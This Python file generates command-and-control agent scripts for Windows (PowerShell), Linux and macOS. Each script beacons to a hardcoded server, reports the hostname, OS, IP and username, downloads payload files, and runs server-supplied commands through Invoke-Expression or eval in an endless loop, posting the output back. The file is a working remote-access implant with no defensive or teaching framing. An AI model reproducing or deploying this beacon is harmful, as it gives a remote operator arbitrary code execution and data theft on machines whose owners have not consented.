serverIP = "10.125.37.96"

def windows_command(uid: int):
    return """
$serverUrl = "http://{serverIP}:8000/api/agent_server/agent_server"

function Get-Commands {{
    try {{
        $hostname = [System.Net.Dns]::GetHostName()
        $os = [System.Environment]::OSVersion.VersionString
        
        $systemInfo = @{{
            hostname = $hostname
            os       = $os
        }}

        $jsonData = $systemInfo | ConvertTo-Json
        
        $headers = @{{
            "Content-Type" = "application/json; charset=utf-8"
        }}

        $response_get_commands = Invoke-RestMethod -Uri "$serverUrl/get_commands/{uid}" -Method Post -Body $jsonData -ContentType "application/json; charset=utf-8" -Headers $headers

        return $response_get_commands
    }} catch {{
        Write-Error "Error getting commands: $_"
        return @()
    }}
}}

function Send-Results {{
    param (
        [string]$command,
        [string]$output
    )
    try {{
        $hostname = [System.Net.Dns]::GetHostName()
        $os = [System.Environment]::OSVersion.VersionString

        $body = @{{
            hostname = $hostname
            os       = $os
            command = $command
            output  = $output
        }} | ConvertTo-Json

        $headers = @{{
            "Content-Type" = "application/json; charset=utf-8"
        }}

        Invoke-RestMethod -Uri "$serverUrl/send_results/{uid}" -Method Post -Body $body -ContentType "application/json; charset=utf-8" -Headers $headers
    }} catch {{
        Write-Error "Error sending results: $_"
    }}
}}

function Get-Payloads {{
    param (
        [string]$payload
    )
    try {{
        $body = @{{
            payload = $payload
        }} | ConvertTo-Json

        $uri = "$serverUrl/get_payloads/$payload"        
        $localFilePath = Join-Path -Path (Get-Location) -ChildPath $payload
        Invoke-WebRequest -Uri $uri -Method Post -OutFile $localFilePath

        Write-Output "File downloaded: $localFilePath"
    }}
    catch {{
        Write-Error "Error getting payload: $_"
    }}
}}

function Connect-ToServer {{
    try {{
        $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.IPAddress -ne '127.0.0.1' }}).IPAddress[0]
        $hostname = [System.Net.Dns]::GetHostName()
        $os = [System.Environment]::OSVersion.VersionString

        $systemInfo = @{{
            ip       = $ipAddress
            hostname = $hostname
            os       = $os
        }}

        $jsonData = $systemInfo | ConvertTo-Json

        $response = Invoke-RestMethod -Uri "$serverUrl/connect/{uid}" -Method Post -Body $jsonData -ContentType "application/json; charset=utf-8"
        Write-Output "Connection response: $($response.message)"
    }} catch {{
        Write-Error "Error connecting to server: $_"
    }}
}}

Connect-ToServer
Send-Results -command "username
" -output $env:username

while ($true) {{
    $response = Get-Commands
    if(-not $response.message) {{
        $realCommands = $response.real_commands
        $commands = $response.commands
        $payloads = $response.payloads

        foreach ($payload in $payloads) {{
            $payload = Get-Payloads -payload $payload 
        }}

        for ($i = 0; $i -lt $realCommands.Count; $i++) {{
            $realCommand = $realCommands[$i]
            $command = $commands[$i]
            try {{
                Write-Output "Executing command: $realCommand"
                $output = Invoke-Expression -Command $realCommand.ToString()
                Send-Results -command $command -output $output
            }} catch {{
                $errorOutput = "Error executing command: $_"
                Send-Results -command $command -output $errorOutput
            }}
        }}
    }} 
    Start-Sleep -Seconds 1
}}
""".format(uid=uid, serverIP=serverIP)


def linux_command(uid: int):
    return """
serverUrl="http://{serverIP}:8000/api/agent_server/agent_server"

get_commands() {{
    hostname=$(hostname)
    os=$(uname -a)

    system_info=$(jq -n --arg hn "$hostname" --arg os "$os" '{{hostname: $hn, os: $os}}')
    response_get_commands=$(curl -s -X POST "$serverUrl/get_commands/{uid}" \
        -H "Content-Type: application/json; charset=utf-8" \
        -d "$system_info")

    echo "$response_get_commands"
}}

send_results() {{
    local command="$1"
    local output="$2"
    hostname=$(hostname)
    os=$(uname -a)

    body=$(jq -n --arg hn "$hostname" --arg os "$os" --arg cmd "$command" --arg out "$output" \
        '{{hostname: $hn, os: $os, command: $cmd, output: $out}}')
    
    curl -s -X POST "$serverUrl/send_results/{uid}" \
        -H "Content-Type: application/json; charset=utf-8" \
        -d "$body"
}}

get_payloads() {{
    local payload="$1"
    uri="$serverUrl/get_payloads/$payload"
    local_file_path="./$payload"

    curl -s -X POST "$uri" -o "$local_file_path"

    echo "File downloaded: $local_file_path"
}}

connect_to_server() {{
    ip_address=$(hostname -I | awk '{{print $1}}')
    hostname=$(hostname)
    os=$(uname -a)

    system_info=$(jq -n --arg ip "$ip_address" --arg hn "$hostname" --arg os "$os" \
        '{{ip: $ip, hostname: $hn, os: $os}}')
    
    response=$(curl -s -X POST "$serverUrl/connect/{uid}" \
        -H "Content-Type: application/json; charset=utf-8" \
        -d "$system_info")
    
    echo "Connection response: $(echo "$response" | jq -r '.message')"
}}

# Initial connection
connect_to_server
send_results "username
" "$USER"

while true; do
    response=$(get_commands)
    message=$(echo "$response" | jq -r '.message')
    
    if [ -z "$message" ]; then
        real_commands=$(echo "$response" | jq -r '.real_commands[]')
        commands=$(echo "$response" | jq -r '.commands[]')
        payloads=$(echo "$response" | jq -r '.payloads[]')

        # Handle payloads
        for payload in $payloads; do
            get_payloads "$payload"
        done

        # Execute commands
        for real_command in $real_commands; do
            echo "Executing command: $real_command"
            output=$(eval "$real_command" 2>&1)
            send_results "$command" "$output"
        done
    fi
    
    sleep 1
done
""".format(uid=uid, serverIP=serverIP)

def mac_command(uid: int):
    return """
serverUrl="http://{serverIP}:8000/api/agent_server/agent_server"

get_commands() {{
    hostname=$(hostname)
    os=$(uname -a)

    system_info=$(jq -n --arg hn "$hostname" --arg os "$os" '{{hostname: $hn, os: $os}}')
    response_get_commands=$(curl -s -X POST "$serverUrl/get_commands/{uid}" \
        -H "Content-Type: application/json; charset=utf-8" \
        -d "$system_info")

    echo "$response_get_commands"
}}

send_results() {{
    local command="$1"
    local output="$2"
    hostname=$(hostname)
    os=$(uname -a)

    body=$(jq -n --arg hn "$hostname" --arg os "$os" --arg cmd "$command" --arg out "$output" \
        '{{hostname: $hn, os: $os, command: $cmd, output: $out}}')
    
    curl -s -X POST "$serverUrl/send_results/{uid}" \
        -H "Content-Type: application/json; charset=utf-8" \
        -d "$body"
}}

get_payloads() {{
    local payload="$1"
    uri="$serverUrl/get_payloads/$payload"
    local_file_path="./$payload"

    curl -s -X POST "$uri" -o "$local_file_path"

    echo "File downloaded: $local_file_path"
}}

connect_to_server() {{
    ip_address=$(hostname -I | awk '{{print $1}}')
    hostname=$(hostname)
    os=$(uname -a)

    system_info=$(jq -n --arg ip "$ip_address" --arg hn "$hostname" --arg os "$os" \
        '{{ip: $ip, hostname: $hn, os: $os}}')
    
    response=$(curl -s -X POST "$serverUrl/connect/{uid}" \
        -H "Content-Type: application/json; charset=utf-8" \
        -d "$system_info")
    
    echo "Connection response: $(echo "$response" | jq -r '.message')"
}}

# Initial connection
connect_to_server
send_results "username
" "$USER"

while true; do
    response=$(get_commands)
    message=$(echo "$response" | jq -r '.message')
    
    if [ -z "$message" ]; then
        real_commands=$(echo "$response" | jq -r '.real_commands[]')
        commands=$(echo "$response" | jq -r '.commands[]')
        payloads=$(echo "$response" | jq -r '.payloads[]')

        # Handle payloads
        for payload in $payloads; do
            get_payloads "$payload"
        done

        # Execute commands
        for real_command in $real_commands; do
            echo "Executing command: $real_command"
            output=$(eval "$real_command" 2>&1)
            send_results "$command" "$output"
        done
    fi
    
    sleep 1
done
""".format(uid=uid, serverIP=serverIP)